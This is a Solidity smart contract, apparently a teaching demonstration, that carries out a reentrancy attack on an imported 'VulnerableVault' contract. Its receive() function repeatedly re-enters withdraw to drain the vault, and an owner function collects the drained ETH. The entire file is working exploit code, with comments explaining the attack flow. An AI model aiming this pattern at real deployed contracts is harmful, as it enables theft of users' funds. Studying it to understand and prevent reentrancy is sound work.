// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";

/**
 * @title Attacker
 * @notice Malicious contract that exploits the reentrancy vulnerability
 * @dev Demonstrates how a reentrancy attack works in practice
 */
contract Attacker {
    VulnerableVault public vault;
    address public owner;
    
    event AttackStarted(uint256 initialDeposit);
    event ReentrancyExecuted(uint256 iteration, uint256 stolenAmount);
    event AttackCompleted(uint256 totalStolen);
    
    constructor(address _vaultAddress) {
        vault = VulnerableVault(payable(_vaultAddress));
        owner = msg.sender;
    }
    
    /**
     * @notice Starts the reentrancy attack
     * @dev Deposits ETH and then tries to drain the vault
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        emit AttackStarted(msg.value);
        
        // 1. Deposit ETH in the vulnerable vault
        vault.deposit{value: msg.value}();
        
        // 2. Start the attack by calling withdraw
        vault.withdraw();
        
        emit AttackCompleted(address(this).balance);
    }
    
    /**
     * @notice Receive function that is called when the contract receives ETH
     * @dev This is where REENTRANCY happens
     * 
     * ATTACK FLOW:
     * 1. Attacker calls vault.withdraw()
     * 2. Vault sends ETH → receive() is executed
     * 3. receive() calls vault.withdraw() AGAIN (reenters)
     * 4. Vault hasn't zeroed the balance yet!
     * 5. Vault sends more ETH
     * 6. Repeats until draining the entire vault
     */
    receive() external payable {
        // Check if there are still funds in the vault
        if (address(vault).balance >= 1 ether) {
            // REENTRANCY: Call withdraw() again!
            vault.withdraw();
            
            emit ReentrancyExecuted(0, msg.value);
        }
    }
    
    /**
     * @notice Owner can withdraw the stolen funds
     */
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @notice Returns how much ETH the attacker managed to steal
     */
    function getStolenAmount() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Returns the balance of the target vault
     */
    function getVaultBalance() external view returns (uint256) {
        return address(vault).balance;
    }
}
